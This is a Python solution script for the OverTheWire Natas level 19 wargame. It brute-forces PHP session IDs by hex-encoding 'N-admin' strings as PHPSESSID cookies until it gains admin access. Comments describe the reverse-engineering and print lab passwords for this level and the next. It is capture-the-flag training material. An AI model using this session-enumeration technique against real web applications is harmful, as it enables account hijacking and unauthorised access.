#!/usr/bin/env python

import requests
import codecs

username = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()

maxid = 640

for i in range(maxid + 1):
    id = "%s-admin" % str(i)
    id_hex = codecs.encode(id).hex()

    cookie = {"PHPSESSID": id_hex}
    response = session.get(url, cookies=cookie, auth=(username, password))
    content = response.text

    if "You are an admin." in content:
        print(content)
    else:
        print("trying id ", id_hex)

# print(session.cookies)
# print( codecs.decode(session.cookies['PHPSESSID'],'hex') )

# soup = BeautifulSoup(content,"html.parser").prettify()
# print (soup)

# this time we got no /index-source.html
# first try is to see what is cookie set this time
# and it's: PHPSESSID = (number of 6 digits) + (constant = 2d61646d696e0)
# and after some try, we find that if we send the request without the username
# this cookie becomes: PHPSESSID = (number of 6 digits) + (constant = 2d)
# and may be the password doesn't affect that cookie
# but having that 2d in the end may be a matter of hex encoding
#
# just a thought python3 may have disable decode attribute to str objects
# so we need to use codecs library to decode the cookie
#
# then we need to enumerate that value using the 'b' + id + '-admin'
# assuming that maxid = 640
#
# we got it right:
# Username: natas20
# Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
